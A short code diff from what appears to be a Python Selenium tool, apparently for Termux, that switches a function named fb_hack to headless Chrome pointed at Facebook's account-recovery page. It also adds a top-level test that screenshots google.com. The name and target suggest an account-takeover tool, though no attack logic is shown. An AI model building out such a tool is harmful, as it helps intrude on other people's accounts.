@@ -12,6 +12,17 @@ from selenium.webdriver.firefox.options import Options
 import logging
 import selenium.webdriver
 import selenium.webdriver.firefox.service
+from selenium import webdriver
+options = webdriver.ChromeOptions()
+options.add_argument("--no-sandbox")
+options.add_argument("--disable-dev-shm-usage")
+options.add_argument("--headless=new")
+driver = webdriver.Chrome(options=options)
+driver.get("https://www.google.com")
+driver.save_screenshot("/sdcard/download/screenshot.png")
+print("Please check screenshot image")
+driver.quit()
+
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
@@ -36,12 +47,12 @@ def sleepy(counter):
 def fb_hack(email, codex, respect):
   os.system('clear')
   soup = BeautifulSoup()
-  driver.quit()
-  options = Options()
-  options.add_argument("--headless")
   options = webdriver.ChromeOptions()
+  options.add_argument("--no-sandbox")
+  options.add_argument("--disable-dev-shm-usage")
+  options.add_argument("--headless=new")
   driver = webdriver.Chrome(options=options)
-  driver.get('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
+  driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
   #wait = WebDriverWait(driver, 10)
